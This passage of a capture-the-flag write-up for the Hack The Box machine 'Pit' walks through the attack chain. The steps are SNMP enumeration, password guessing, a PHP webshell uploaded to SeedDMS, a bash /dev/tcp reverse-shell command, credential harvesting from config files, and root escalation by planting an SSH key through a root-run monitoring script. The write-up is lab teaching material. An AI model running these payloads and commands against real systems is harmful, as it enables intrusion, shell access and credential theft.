   +--nsExtendOutput2Table(4)
      |
      +--nsExtendOutput2Entry(1)
         |  Index: nsExtendToken, nsExtendLineIndex
         |
         +-- ---- INTEGER   nsExtendLineIndex(1)
         |        Range: 1..1024
         +-- -R-- String    nsExtendOutLine(2)
                  Textual Convention: DisplayString
                  Size: 0..255
</code></pre><p>We can simply read each lines instead of the whole output with <code>nsExtendOutLine</code>:</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 nsExtendOutLine
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.1 = STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.2 = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.3 = STRING: Mem:          3.8Gi       459Mi       3.0Gi        40Mi       368Mi       3.1Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.4 = STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.5 = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.6 = STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.7 = STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.8 = STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.11 = STRING:
[..]
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.26 = STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.28 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.30 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.31 = STRING:  03:28:34 up 2 days,  2:16,  0 users,  load average: 0.09, 0.03, 0.01
End of MIB
</code></pre>
<p>We discover username <strong>michelle</strong> and the system version: <strong>CentOS Linux release 8.3.2011</strong></p>
<h2 id="shell-as-michelle">Shell as Michelle</h2>
<p>searchsploit find at least 2 RCE vulnerabilities for that DMS:</p>
<table>
<thead>
<tr>
<th>Exploit Title</th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)</td>
<td>php/webapps/50062.py</td>
</tr>
<tr>
<td>SeedDMS versions &lt; 5.1.11 - Remote Command Execution</td>
<td>php/webapps/47022.txt</td>
</tr>
</tbody>
</table>
<p>but both require at least username and password, we try with <strong>michelle</strong> and common passwords and we can finally sign in <a href="http://dms-pit.htb/seeddms51x/seeddms">http://dms-pit.htb/seeddms51x/seeddms</a> with <strong>michelle:michelle</strong></p>
<p>There is an Administrator Notes about recent upgrade to 5.1.15:</p>
<pre><code>    Dear colleagues, Because of security issues in the previously installed version (5.1.10),
    I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information.
    If you find any issues, please report them immediately to admin@dms-pit.htb.
</code></pre>
<p>Michelle has permissions to upload files, so we can attempt to upload a webshell:</p>
<pre><code>echo '&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;' &gt; ~/Downloads/sh.php
</code></pre>
<p>Once uploaded, we click on the Download button; however instead of executing, it downloads as an attachment:</p>
<p>Request shows a <code>documentid=30 and version=1</code>:</p>
<pre><code>GET /seeddms51x/seeddms/op/op.Download.php?documentid=30&amp;version=1 HTTP/1.1
[..]
Cookie: mydms_session=a5522439228422452acad40d8b1fba6f
</code></pre>
<p>Response:</p>
<pre><code>HTTP/1.1 200 OK
[..]
Content-Transfer-Encoding: binary
Content-Disposition: attachment; filename=&quot;sh.php&quot;; filename*=UTF-8''sh.php
Cache-Control: must-revalidate

&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;
</code></pre>
<p>We have to find where is the file inside seeddms if we want to figure out how to execute it as a PHP page instead of downloading. Searching source code in github, we find this repo with clear information on download: <a href="https://github.com/rachmari/seeddms#data-storage">https://github.com/rachmari/seeddms#data-storage</a></p>
<pre><code>A content directory is located within the data directory named 1048576 by default. This directory name can also be changed in the settings.xml file. When documents are uploaded using SeedDMS, the files are stored in the data/1048576 directory.

The directories within 1048576 are also numbered. The number corresponds to the document id in the mysql table tblDocuments. The document id directory is a flat directory that contains all of a document's files (including attachments) for every version of that documet. Files are named using numbers and letters. File names that only contain a number indicate the version of the document.
</code></pre>
<p>Basically it translates into this file path <strong>/seeddms51x/seeddms/1048576/$documentid/$version</strong></p>
<p>Looking at <strong>op.Download.php</strong> <a href="https://github.com/rachmari/seeddms/blob/master/op/op.Download.php">source code</a>, we find:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    <span style="color:#8be9fd;font-style:italic">$filepath</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$dms</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">contentDir</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$file</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getPath</span>();

    <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">getPath</span>() { <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">_document</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getDir</span>() <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">_version</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">_fileType</span>; }
</code></pre></td></tr></table>
</div>
</div><p>which suggests the fileType (the file extension) must be appended. We can try with curl:</p>
<pre><code>curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id -H &quot;Cookie: mydms_session=a5522439228422452acad40d8b1fba6f&quot;
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
</code></pre>
<p>it works brilliantly, so now we can get a reverse shell. Note the server delete files regularly so we may have to reupload the file several time.</p>
<p>We can use basic urlencoded reverse shell:</p>
<pre><code>plain:   bash -c &quot;bash -i &gt;&amp;   /dev/tcp/10.10.14.53/443 0&gt;&amp;1&quot;
encoded: bash+-c+%22bash+-i+&gt;%26+/dev/tcp/10.10.14.53/443+0&gt;%261%22
</code></pre>
<p>We can&rsquo;t obtain the reverse shell:</p>
<pre><code>URL=&quot;http://dms-pit.htb/seeddms51x/data/1048576/35/1.php&quot;
curl -vvv -G $URL -H &quot;Cookie: mydms_session=a5522439228422452acad40d8b1fba6f&quot; \
--data-urlencode &quot;cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.53/443 0&gt;&amp;1'&quot;
</code></pre>
<p>So we need to try different way or explore the file system:</p>
<p>ls -l ../../conf</p>
<pre><code>total 36
-r--------. 1 nginx nginx 11672 Mar 14 2018 settings.xml
-rw-r--r--. 1 nginx nginx 13702 Sep 27 2017 settings.xml.template
-rw-r--r--. 1 nginx nginx 4247 Feb 20 2013 stopwords.txt
</code></pre>
<p>find /var/www/html/seeddms51x/ -name settings.xml</p>
<pre><code>/var/www/html/seeddms51x/data/conf/settings.xml
/var/www/html/seeddms51x/conf/settings.xml
</code></pre>
<p>cat ../../conf/settings.xml | grep -i pass</p>
<pre><code>[..]
&lt;database dbDriver=&quot;sqlite&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;/home/www-data/seeddms51x/data/content.db&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;seeddms&quot; doNotCheckVersion=&quot;false&quot;&gt;
[..]
</code></pre>
<p>cat /var/www/html/seeddms51x/conf/settings.xml</p>
<pre><code>[..]
&lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&gt;
[..]
</code></pre>
<p>We have to visit the webpage at port 9090 to successful sign in with <strong>michelle:ied^ieY6xoquu</strong></p>
<p>The about section informs we are on <a href="https://cockpit-project.org/">https://cockpit-project.org/</a> version 224.2</p>
<p>There is a webshell accessible from <a href="https://dms-pit.htb:9090/system/terminal">https://dms-pit.htb:9090/system/terminal</a> , so we can</p>
<pre><code>[I] ➜ nc -lnvp 11111
Connection from 10.10.10.241:52674
[michelle@pit ~]$ cat user.txt
cat user.txt
85f4cffb98144f909ec8a43be9655d53
</code></pre>
<h1 id="privesc">Privesc</h1>
<p>Going back to snmp, there is a process of interest:</p>
<pre><code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects
[..]
nsExtendCommand.&quot;monitoring&quot; = STRING: /usr/bin/monitor
[..]
nsExtendExecType.&quot;monitoring&quot; = INTEGER: exec(1)
nsExtendRunType.&quot;monitoring&quot; = INTEGER: run-on-read(1)
[..]
nsExtendOutput1Line.&quot;monitoring&quot; = STRING: Memory usage
Timeout: No Response from 10.10.10.241
</code></pre>
<p>it means that a process runs the command <code>/usr/bin/monitor</code> upon SNMP read event. In other words, every time we execute this snmpwalk command, it will execute this script or binary.</p>
<p>Let&rsquo;s explore <code>/usr/bin/monitor</code>. It will execute as root any bash script starting with check in the folder <code>/usr/local/monitoring</code>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>michelle@pit .ssh<span style="color:#ff79c6">]</span>$ ls -l /usr/bin/monitor
-rwxr--r--. <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">88</span> Apr <span style="color:#bd93f9">18</span>  <span style="color:#bd93f9">2020</span> /usr/bin/monitor
<span style="color:#ff79c6">[</span>michelle@pit .ssh<span style="color:#ff79c6">]</span>$ cat /usr/bin/monitor
<span style="color:#6272a4">#!/bin/bash</span>

<span style="color:#ff79c6">for</span> script in /usr/local/monitoring/check*sh
<span style="color:#ff79c6">do</span>
    /bin/bash <span style="color:#8be9fd;font-style:italic">$script</span>
<span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><p>Further exploration of this folder, we observe the <code>+</code> sign on the folder permissions <code>drwxrwx---+</code> and realize that michelle can write in it but cannot read files.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">[</span>michelle@pit .ssh<span style="color:#ff79c6">]</span>$ ls -l /usr/local/ | grep monitoring
drwxrwx---+ <span style="color:#bd93f9">2</span> root root <span style="color:#bd93f9">122</span> Oct  <span style="color:#bd93f9">3</span> 08:50 monitoring
<span style="color:#ff79c6">[</span>michelle@pit .ssh<span style="color:#ff79c6">]</span>$ getfacl /usr/local/monitoring
getfacl: Removing leading <span style="color:#f1fa8c">&#39;/&#39;</span> from absolute path names
<span style="color:#6272a4"># file: usr/local/monitoring</span>
<span style="color:#6272a4"># owner: root</span>
<span style="color:#6272a4"># group: root</span>
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
</code></pre></td></tr></table>
</div>
</div><p>We just have to create a check_make_me_root.sh to become root. For example upload a public key into /root/.ssh/authorized_keys</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAmmBiYlHIWk1kQ67MCFZa97diYFg6X9gXnep/BAkdD/ root@any.htb&#34; \
</span><span style="color:#f1fa8c">&gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_make_me_root.sh
</code></pre></td></tr></table>
</div>
</div><p>Moment of truth, we execute <code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects</code> then we try to ssh login as root, and it works like a charm:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">[</span>I<span style="color:#ff79c6">]</span> ➜ ssh -i ~/.ssh/id_ed25519_htb root@pit.htb
Web console: https://pit.htb:9090/

Last login: Mon Jul <span style="color:#bd93f9">26</span> 06:58:15 <span style="color:#bd93f9">2021</span>
<span style="color:#ff79c6">[</span>root@pit ~<span style="color:#ff79c6">]</span><span style="color:#6272a4"># cat root.txt</span>
7fb116865e6477410fca1d8cc4426733
</code></pre></td></tr></table>
</div>
</div><h2 id="further-exploration">Further exploration</h2>
<pre><code>[root@pit ~]# cd /usr/local/monitoring/
[root@pit monitoring]# ls -la
total 20
drwxrwx---+  2 root root 122 Oct  3 09:10 .
drwxr-xr-x. 13 root root 149 Nov  3  2020 ..
-rwx------.  1 root root  50 Oct  3 09:10 check_free.sh
-rwx------.  1 root root 246 Oct  3 09:10 check_mariadb.sh
-rwx------.  1 root root  73 Oct  3 09:10 check_release.sh
-rwx------.  1 root root 217 Oct  3 09:10 check_selinux.sh
-rwx------.  1 root root  50 Oct  3 09:10 check_uptime.sh

[root@pit monitoring]# for i in * ; do echo $i ; cat $i ; done
</code></pre>
<p>check_free.sh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Memory usage&#34;</span>
/usr/bin/free -h
</code></pre></td></tr></table>
</div>
</div><p>check_mariadb.sh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Database status&#34;</span>
/usr/bin/mysql -u root -p<span style="color:#f1fa8c">&#39;ek)aizee^FaiModa~ce]z6c&#39;</span> -e <span style="color:#f1fa8c">&#39;use seeddms&#39;</span> &amp;&gt;/dev/null
<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#8be9fd;font-style:italic">$?</span> -eq <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">then</span>
    <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;OK - Connection to database successful.&#34;</span>
<span style="color:#ff79c6">else</span>
    <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;ERROR - Unable to connect to database.&#34;</span>
<span style="color:#ff79c6">fi</span>
</code></pre></td></tr></table>
</div>
</div><p>check_release.sh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;System release info&#34;</span>
/usr/bin/cat /etc/redhat-release
</code></pre></td></tr></table>
</div>
</div><p>check_selinux.sh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;SELinux Settings&#34;</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;user&#34;</span>
/usr/sbin/semanage user -l
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;login&#34;</span>
/usr/sbin/semanage login -l
<span style="color:#6272a4">#echo &#34;permissive&#34;</span>
<span style="color:#6272a4">#/usr/sbin/semanage permissive -l</span>
<span style="color:#6272a4">#echo &#34;boolean&#34;</span>
<span style="color:#6272a4">#/usr/sbin/semanage boolean -l</span>
</code></pre></td></tr></table>
</div>
</div><p>check_uptime.sh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;System uptime&#34;</span>
/usr/bin/uptime
</code></pre></td></tr></table>
</div>
</div><p>We can retrieve the exact same snmpwalk output:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
